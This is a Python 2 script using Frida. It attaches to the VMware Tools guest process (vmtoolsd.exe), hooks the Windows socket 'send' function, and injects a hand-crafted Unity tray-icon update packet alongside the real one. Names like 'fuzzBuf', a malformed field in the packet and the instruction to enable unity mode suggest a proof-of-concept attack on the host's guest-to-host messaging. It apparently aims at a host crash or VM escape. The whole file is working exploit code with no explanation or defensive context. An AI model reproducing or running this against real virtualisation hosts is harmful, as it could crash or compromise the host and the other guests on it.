'''
First run the python script and enable the unity mode.
'''

import frida
import os
import sys
import signal
import time
import psutil

base_script = """
    var base = Module.findBaseAddress("ws2_32.dll");

    function start() {
        var send = Module.findExportByName('ws2_32.dll', 'send');

        var vsock_send = new NativeFunction(send, 'int', ['int', 'pointer', 'ulong', 'int'], 'win64');

        Interceptor.replace(send, new NativeCallback(function (sock, data, dataLen, flags) {

            if(dataLen > 0x20){

                var buf = Memory.readByteArray(data, dataLen);
                var trayicon_update = 'ghi.guest.trayIcon.update';
                var str_target = Memory.readAnsiString(data.add(0x20), dataLen - 1);

                if(str_target.includes(trayicon_update)){

                    var packet = new Uint8Array( [0x00,0x00,0x00,0xee,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0xd2,0x67,0x68,0x69,0x2e,0x67,0x75,0x65,0x73,0x74,0x2e,0x74,0x72,0x61,0x79,0x49,0x63,0x6f,0x6e,0x2e,0x75,0x70,0x64,0x61,0x74,0x65,0x20,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x12,0x30,0x30,0x30,0x30,0x30,0xFE,0x30,0x30,0x30,0x30,0x30,0x32,0x30,0x33,0x38,0x43,0x2c,0x31,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x6c,0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,0x00,0x00,0x00,0x0d,0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0f,0x08,0x06,0x00,0x00,0x00,0x3b,0xd6,0x95,0x4a,0x00,0x00,0x00,0x33,0x49,0x44,0x41,0x54,0x28,0x91,0x63,0x6c,0x6a,0x6a,0xfa,0xcf,0x40,0x26,0x60,0x61,0x60,0x60,0x60,0xc8,0xcb,0xcb,0x23,0x59,0xe3,0xa4,0x49,0x93,0x18,0x98,0xc8,0xb5,0x95,0x81,0x81,0x61,0x54,0xf3,0xa8,0xe6,0xc1,0xac,0x99,0x85,0x81,0x01,0x92,0xc8,0xc9,0x01,0x00,0x30,0xec,0x07,0x5d,0xc2,0x10,0x50,0xd3,0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x70,0x72,0x6f,0x63,0x65,0x78,0x70,0x36,0x34,0x2e,0x65,0x78,0x65,0x2c,0x31,0x00] );

                    var fuzzLen = packet.length;

                    var fuzzBuf = Memory.alloc(fuzzLen);
                        
                    Memory.writeByteArray(fuzzBuf, packet.buffer);

                    vsock_send(sock, fuzzBuf, fuzzLen, flags);
                }
            }

            var ret = vsock_send(sock, data, dataLen, flags);
            return ret;

        
        }, 'int', ['int', 'pointer', 'ulong', 'int'], 'win64'));

    }

    start();
    console.log("start");
"""

"""

"""

def main():
    global pid

    if len(sys.argv) < 2:

        process = filter(lambda p: p.name() == "vmtoolsd.exe", psutil.process_iter())

        for i in process:
            print i.name(), i.pid
            pid = i.pid

    else:
        pid = int(sys.argv[1])

    session = frida.attach(pid)
    
    scriptc = base_script
    script = session.create_script(scriptc)
    script.load()
    
    sys.stdin.read()

if __name__ == "__main__":
    main()
